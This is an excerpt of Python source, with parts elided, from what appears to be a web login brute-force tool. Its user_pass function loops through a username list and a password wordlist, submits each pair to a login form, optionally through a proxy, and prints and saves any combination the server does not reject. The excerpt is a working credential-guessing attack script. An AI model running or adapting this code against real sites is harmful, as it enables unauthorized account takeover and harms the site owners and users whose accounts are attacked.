...
def user_pass(url,userform,passform,keyfalse,keytrue,usernames,passlist,proxy):
	baner()
	...
	try:file=open(passlist,'r').readlines()
	except:
		print(error+f"not found path{R} {passlist}")
		sys.exit()
	try:file=open(usernames,'r')
	except:
		print(error+f"not found path{R} {usernames}")
		sys.exit()
		
	users=open(usernames,'r').readlines()
	wordpassw=open(passlist,'r').readlines()
	if proxy != 'Null':
	...
	for worduser in users:
		worduser=worduser.strip()
		for wordpass in wordpassw:
			wordpass=wordpass.strip()
			...
			browser.form[uses]=worduser
			browser.form[passw]=wordpass
			browser.submit()
			urlsw=browser.geturl()
			ml=browser.response().read()
			html=ml.decode()
			if keyfalse not in html:
				print(done+G+f"username :{P} {worduser}")
				print(done+G+f"password :{P} {wordpass}")
				sives(url,worduser,wordpass)
				input(start+'Enter to continue exit:CTRL ^C : ')
			elif keyfalse in html:
				print(sts+f"username [{worduser}] password [{wordpass}] {GR}#status {R}failed!")
